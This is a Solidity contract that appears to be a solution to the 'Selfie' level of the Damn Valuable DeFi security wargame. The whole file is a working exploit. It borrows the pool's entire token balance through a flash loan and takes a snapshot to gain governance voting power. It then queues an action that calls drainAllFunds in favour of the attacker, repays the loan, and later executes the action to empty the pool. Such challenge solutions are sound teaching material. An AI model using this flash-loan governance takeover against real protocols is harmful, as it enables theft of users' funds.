// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";

contract AttackSelfie {
    DamnValuableTokenSnapshot private dvt;
    SimpleGovernance private simpleGovernance;
    SelfiePool private selfiePool;

    address private owner;
    uint256 private actionId;

    constructor(
        address _dvt,
        address _simpleGovernance,
        address _selfiePool
    ) {
        owner = msg.sender;
        dvt = DamnValuableTokenSnapshot(_dvt);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        selfiePool = SelfiePool(_selfiePool);
    }

    function startAttack() public {
        uint256 loanAmount = dvt.balanceOf(address(selfiePool));
        selfiePool.flashLoan(loanAmount);
    }

    function receiveTokens(address, uint256 _borrowAmount) external {
        //queue gov action
        dvt.snapshot();
        actionId = simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );

        //pay back loan
        dvt.transfer(address(selfiePool), _borrowAmount);
    }

    //After action deplay has elapsed, extecute malicious action
    function finishAttack() public {
        simpleGovernance.executeAction(actionId);
    }
}
